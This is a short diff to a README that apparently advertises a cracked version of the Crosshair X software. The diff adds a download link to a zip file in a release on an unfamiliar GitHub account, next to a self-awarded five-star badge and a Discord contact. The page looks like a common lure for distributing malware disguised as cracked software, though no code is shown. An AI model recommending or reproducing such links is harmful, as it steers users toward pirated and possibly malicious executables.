@@ -4,7 +4,7 @@
 
 [![Rating](https://img.shields.io/badge/Rating-5%20Stars-Gold?style=for-the-badge)](#)
 
-# [Download]()  
+# [Download](https://github.com/frampmazayded92/Crosshair-X-Crack/releases/download/Download/Crosshair.zip)  
 💿 Supported OC: Windows 7, Windows 8, Windows 8.1, Windows 10, Windows 11
 IF YOU HAVE PROBLEMS WRITE IN DISCORD - vipzaza
 </div>
